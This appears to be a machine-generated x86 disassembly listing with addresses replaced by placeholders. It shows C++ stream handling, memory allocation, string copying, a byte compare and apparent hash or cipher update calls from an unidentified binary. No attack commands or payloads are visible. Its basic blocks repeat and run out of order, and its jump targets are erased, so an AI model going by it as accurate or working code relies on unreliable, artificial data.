add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edx [ ebp - 0x38 ]
push edx
push ecx
push r--data
push rw-data
call sub_404c10
add esp 0xc
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x30 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
jmp r-xdata
or eax 0x4
sub_4241b0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov edi eax
lea eax [ edi + 0x3c ]
push eax
push ecx
push r--data
push ecx
lea ecx [ edi + 0x20 ]
push ecx
push rw-data
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ebx [ edi + 0x14 ]
push 0x10
call sub_438178
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov [ ebp - 0x8 ] edi
mov esi edi
mov esi eax
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] edi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
cmp esi edi
je r-xdata
mov eax [ esi ]
mov [ ebp - 0x4 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
call sub_40ba20
add esp 0x4
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
cmp eax edi
je r-xdata
jmp r-xdata
push esi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
call sub_43811c
add esp 0x4
mov edx [ ebp - 0x8 ]
mov ecx [ esi + 0x4 ]
push edx
push ecx
call sub_40cbe0
mov edx [ esi ]
push edx
call sub_43811c
add esp 0xc
cmp [ eax + 0x14 ] 0x10
jb r-xdata
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_404c10
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ eax ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp ebx edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
cmp esi [ eax + 0x20 ]
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
mov ecx [ ebp - 0x8 ]
add eax 0x2c
mov [ ebp - 0x4 ] eax
cmp eax [ ecx + 0x4 ]
jne r-xdata
jmp r-xdata
push edi
push eax
call sub_402d50
or eax 0x4
mov eax [ ebp - 0x4 ]
mov esi ecx
mov edx [ esi + 0x4 ]
mov eax [ esi ]
push 0x20
push ecx
push edx
push ecx
push r--data
push ecx
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_420bb0
add esp 0x4
push eax
call sub_409de0
add esp 0xc
push eax
call sub_420bb0
add esp 0x4
push eax
call sub_40e950
movzx eax [ esi + 0x8 ]
add esp 0x8
cmp ax di
je r-xdata
cmp [ esi + 0x20 ] 0x10
jb r-xdata
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_41a660
jmp r-xdata
lea eax [ esi + 0xc ]
mov eax [ esi + 0xc ]
jmp r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov ecx [ rw-data ]
mov eax [ ecx + 0x4 ]
xor ebx ebx
test [ eax + rw-data ] 0x6
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
cmp ebx edi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push eax
push rw-data
call sub_404c10
add esp 0x8
mov edx [ ebp - 0x4 ]
add esi 0x28
cmp esi [ edx + 0x20 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] edi
jne r-xdata
mov ebx 0x4
mov eax edx
push edi
push eax
call sub_402d50
or eax 0x4
sub_424460
push ebp
mov ebp esp
push 0xffffffff
push sub_451c82
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x1c ]
push edx
add ecx esi
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_40a340
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov ecx eax
call sub_403670
mov [ ebp - 0x4 ] 0x5
call j_sub_43d14a
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + esi + 0x38 ]
mov edi [ edi ]
mov [ ebp - 0x24 ] 0x0
movzx ecx [ ecx + esi + 0x40 ]
push ebx
push ecx
mov ecx [ ebp - 0x14 ]
add eax esi
push eax
push edx
mov edx [ ebp - 0x24 ]
push edx
mov edx [ edi + 0x1c ]
lea eax [ ebp - 0x24 ]
push eax
call edx
cmp [ ebp - 0x24 ] 0x0
mov edi 0x4
jne r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_436188
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_4361b0
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_424593
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_424630
mov ecx [ eax + 0x4 ]
push esi
mov esi [ eax ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
ja r-xdata
lea ecx [ edi * 8 ]
sub ecx edi
lea eax [ esi + ecx * 4 ]
pop esi
retn
push r--data
call sub_435ac6
sub_424670
push ebp
mov ebp esp
push 0xffffffff
push sub_451c42
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
xor ebx ebx
mov esi edi
mov [ ebp - 0x24 ] 0x9
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x38 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + edi + 0xc ] ebx
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + edi + 0xc ] ebx
sete cl
mov [ ebp - 0x34 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + edi + 0x3c ]
cmp eax ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edi + 0x20 ] ebx
mov [ eax + edi + 0x24 ] ebx
mov ecx [ edi ]
mov ecx [ ecx + 0x4 ]
add ecx edi
cmp edx ebx
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x18 ]
push edx
add ecx edi
call sub_402e50
push eax
mov [ ebp - 0x4 ] 0x2
call sub_404ad0
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x18 ]
add esp 0x4
mov [ ebp - 0x20 ] eax
test ebx ebx
je r-xdata
mov ecx eax
call sub_403670
mov [ ebp - 0x4 ] 0x5
call j_sub_43d14a
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx [ edx + edi + 0x24 ]
mov eax [ edx + edi + 0x20 ]
test ecx ecx
jg r-xdata
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_436188
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
cmp ecx ebx
je r-xdata
mov ecx esi
call sub_404650
push ebx
push eax
call sub_402d50
or eax 0x4
sub eax 0x1
sbb ecx 0x0
mov esi eax
jl r-xdata
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x1c ]
not esi
call sub_4361b0
and esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
mov eax [ ebp - 0x24 ]
mov edx [ edx + 0x28 ]
push eax
call edx
movzx edx ax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
lea esp [ esp ]
xor esi esi
xor ecx ecx
jmp r-xdata
cmp eax 0x1
ja r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp - 0x38 ]
xor ebx ebx
test ecx ecx
jl r-xdata
mov [ ebp - 0x4 ] 0x3
mov edx [ edx + edi + 0x14 ]
and edx 0x1c0
mov [ ebp - 0x2c ] ecx
cmp edx 0x40
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea ebx [ eax + 0x2 ]
mov [ ecx ] ebx
mov [ eax ] dx
mov eax edx
jmp r-xdata
jg r-xdata
cmp [ ebp - 0x2c ] 0x0
jl r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
movzx edx [ eax + edi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test esi esi
je r-xdata
jg r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
movzx edx [ eax + edi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test esi esi
je r-xdata
mov ecx [ ebp - 0x2c ]
add esi 0xffffffff
adc ecx 0xffffffff
mov [ ebp - 0x2c ] ecx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea ebx [ eax + 0x2 ]
mov [ ecx ] ebx
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
add esi 0xffffffff
adc [ ebp - 0x2c ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea ebx [ eax + 0x2 ]
mov [ ecx ] ebx
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_4248e4
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_4249a0
push esi
mov esi eax
push edi
mov ecx r--data
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
mov edi edi
pop edi
xor eax eax
pop esi
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
retn
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_424a20
push ebp
mov ebp esp
push 0xffffffff
push sub_453cc9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x50 ] esi
mov [ ebp - 0x54 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x48 ] ax
push 0x6
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x50 ] 0x1
mov [ ebp - 0x4c ] sub_424b20
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0x50
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
sub_424b20
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x18 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx ]
mov eax [ ebx + 0x4 ]
push esi
push edi
cmp ecx eax
je r-xdata
push r--data
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
sub eax ecx
mov esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jb r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x2
ja r-xdata
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebx
xor ecx esp
mov al 0x1
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
cmp [ ecx + 0x14 ] 0x8
lea eax [ esp + 0x14 ]
push eax
jb r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov si [ edx ]
add edx 0x2
test si si
jne r-xdata
sub edx edi
sar edx 0x1
push edx
call sub_401c90
call sub_425800
add esp 0x20
test al al
je r-xdata
sub esp 0x1c
mov ecx esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] dx
mov edx eax
mov [ esp + 0x30 ] esp
lea edi [ edx + 0x2 ]
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebx + 0x4 ]
sub eax 0x1c
cmp [ eax + 0x14 ] 0x8
jb r-xdata
sub esp 0x1c
mov esi esp
mov [ esp + 0x30 ] esp
call sub_401980
call sub_424cb0
add esp 0x20
test al al
jne r-xdata
mov eax [ eax ]
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
sub_424cb0
push ebp
mov ebp esp
push 0xffffffff
push sub_45280c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x534
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x514 ] eax
xor ebx ebx
push 0x4
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x509 ] bl
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov [ ebp - 0x518 ] ebx
mov edi ebx
mov edi eax
mov [ eax ] ebx
mov [ ebp - 0x518 ] edi
jmp r-xdata
call sub_4052a0
test al al
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ edi ] ebx
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x518 ]
push ecx
call sub_43811c
add esp 0x4
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov ecx 0xb
mov esi r--data
lea edi [ ebp - 0x9c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx 0xa
mov esi r--data
lea edi [ ebp - 0x6c ]
[ edi ] [ esi ]
push 0x1c
movsb [ edi ] [ esi ]
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov al [ ebp - 0x509 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43811c
add esp 0x4
mov [ ebp - 0x530 ] ebx
mov edi ebx
mov edi eax
mov [ eax + 0x14 ] 0xf
mov [ eax + 0x10 ] ebx
mov [ eax ] bl
mov [ ebp - 0x530 ] edi
jmp r-xdata
mov esi [ ebp - 0x530 ]
cmp esi ebx
je r-xdata
push 0x1c
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x510 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x518 ]
push edi
push ecx
call sub_405480
add esp 0x8
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x520 ] ebx
push 0xffffffff
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push edi
mov ecx esi
mov [ esi ] 0x0
call sub_405cb0
mov [ ebp - 0x520 ] esi
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] 0x0
call sub_43811c
add esp 0x4
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
mov [ ebp - 0x538 ] ebx
push 0x1
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push r--data
mov ecx esi
mov [ esi ] 0x0
call sub_405a70
mov [ ebp - 0x538 ] esi
jmp r-xdata
mov ecx [ ebp - 0x520 ]
push 0x14
mov eax r--data
mov [ ebp - 0x4 ] 0x0
call sub_409970
push 0x1c
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x510 ] esi
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
je r-xdata
mov esi [ ebp - 0x538 ]
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x100 ]
push eax
call sub_42f1a0
mov esi [ ebp - 0x51c ]
add esp 0x4
push 0x10
lea ecx [ esi + 0x70 ]
push ecx
lea edx [ ebp - 0x100 ]
push edx
call sub_42efa0
add esp 0xc
push 0x2f
lea eax [ ebp - 0x9c ]
push eax
lea ecx [ ebp - 0x100 ]
push ecx
call sub_42efa0
mov edx [ ebp - 0x514 ]
add esp 0xc
push 0x10
push edx
lea eax [ ebp - 0x100 ]
push eax
call sub_42efa0
add esp 0xc
push 0x29
lea ecx [ ebp - 0x6c ]
push ecx
lea edx [ ebp - 0x100 ]
push edx
call sub_42efa0
add esp 0xc
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp - 0x20 ]
push ecx
call sub_42f080
lea edx [ ebp - 0x20 ]
push edx
lea eax [ ebp - 0x508 ]
push 0x10
push eax
call sub_42f390
add esp 0x14
lea ecx [ ebp - 0x40 ]
push ecx
lea edx [ esi + 0x80 ]
push edx
lea eax [ ebp - 0x508 ]
push 0x20
push eax
call sub_42f200
push esi
call sub_438111
add esp 0x14
push 0x1c
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x510 ] esi
mov [ ebp - 0x4 ] 0x3
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x538 ]
mov edi [ ebp - 0x518 ]
lea edx [ ebp - 0x510 ]
push edx
mov edx [ ebp - 0x520 ]
lea eax [ ebp - 0x51c ]
push eax
push ecx
mov [ ebp - 0x4 ] 0x0
push edx
mov [ ebp - 0x510 ] ebx
mov [ ebp - 0x51c ] ebx
call sub_405830
add esp 0x10
test al al
je r-xdata
cmp [ ebp - 0x520 ] ebx
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x528 ] ebx
mov edi ebx
mov ecx [ ebp - 0x530 ]
push 0xffffffff
push ebx
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov ecx esi
mov [ esi ] 0x0
call sub_405cb0
mov edi esi
mov [ ebp - 0x528 ] edi
jmp r-xdata
mov esi [ ebp - 0x520 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] 0x0
call sub_43811c
add esp 0x4
mov ecx [ esi ]
push ecx
call sub_43811c
add esp 0x4
mov [ ebp - 0x534 ] ebx
push 0x50
push ebx
push esi
call sub_43a820
add esp 0xc
mov [ ebp - 0x534 ] esi
jmp r-xdata
push 0x1a
mov eax r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x0
call sub_409970
push 0x50
call sub_438178
mov esi eax
add esp 0x4
cmp esi ebx
je r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] 0x0
call sub_43811c
add esp 0x4
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x4
mov edx [ ebp - 0x534 ]
push edx
call sub_43811c
add esp 0x4
cmp [ ebp - 0x528 ] ebx
je r-xdata
push 0x10
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x518 ]
lea edx [ ebp - 0x534 ]
push edx
push edi
push eax
call sub_405500
add esp 0xc
test al al
je r-xdata
mov esi [ ebp - 0x528 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x52c ] ebx
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ ebp - 0x52c ] eax
jmp r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push esi
mov [ esi ] 0x0
call sub_43811c
add esp 0x4
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
